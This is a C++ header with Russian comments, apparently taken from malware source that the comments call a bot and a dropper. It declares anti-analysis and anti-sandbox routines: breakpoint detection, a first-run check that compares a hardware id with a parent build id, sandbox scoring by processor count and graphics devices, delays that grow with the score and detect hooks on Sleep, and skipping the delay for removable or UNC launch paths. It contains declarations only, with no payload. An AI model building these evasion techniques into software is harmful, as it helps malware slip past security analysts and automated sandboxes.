#pragma once

#include "global.hpp"

namespace antianalysis
{
	BOOL check_for_breakpoint(LPBYTE lpFunctionEntry);
	BOOL exec_all_longterm();
}


namespace antisbx
{
	class IAntiSandbox
	{
	public:
		virtual ~IAntiSandbox() = default;
		// выход произойдет только в случае отсутствия песочницы
		virtual BOOL enter() = 0;
	};

	// в случае если апп запустился на машине первый раз, то считает баллы присутствия в песочнице и в зависимости от результата задерживает исполнение
	// делает это через сравнение текущего hid с соответствующей длиной первой подстроки в parentbid, если hid == первым байтам parentbid, то на запуск на машине не первый раз
	// иначе запуск первый раз и надо запустить анализатор вероятности нахождения в песочнице и сделать необходимую задержку с учетом перехвата Sleep
	// пропускает задержку в случае запуска с removable носителя != системному диску (иногда системный диск определяетс как removable) или по UNC пути: такие условия запуска сэмплов в песочницах не встречались
	class SandboxDelayMachineEntry : public IAntiSandbox
	{
	public:
		SandboxDelayMachineEntry();
		~SandboxDelayMachineEntry();

		// сделает обязательные проверки на необходимость задержки, и если бот запустился не в первый раз на этом железе или запустился с removable/UNC путей, то выходит без задержки
		// иначе дефолтная задержка - 10 секунд, с десятикратным увеличением задержки на каждый балл песочницы: проверки на количество процессоров, на графические устройства и т.д.
		BOOL enter();

	protected:
		BOOL check_required();
		// проверка что запущены по пути с которого песочницы не запускают
		BOOL is_whitelist_path();
		// проверка что попали на эту машину впервые: либо нулевое поколение дроппера, либо запуск екзешника зараженного на другой машине
		BOOL is_entry_machine();
		// считает количество баллов, что это песочница. По дефолту возвращает 1
		INT get_score();

	private:
		// проверим, что графика на машине какое-то говно
		BOOL isNoGraphics();
		// вернет TRUE если переданная строка содержится в черном списке
		BOOL isBlacklisted(PWCHAR *pwBlacklist, UINT iBlacklistAmount, PWCHAR pwString);
		// задержка через WaitForSingleObject с детектом хуков Sleep, если Sleep хукнут возвращает FALSE
		BOOL delay(DWORD dwMilliseconds);
	};
}

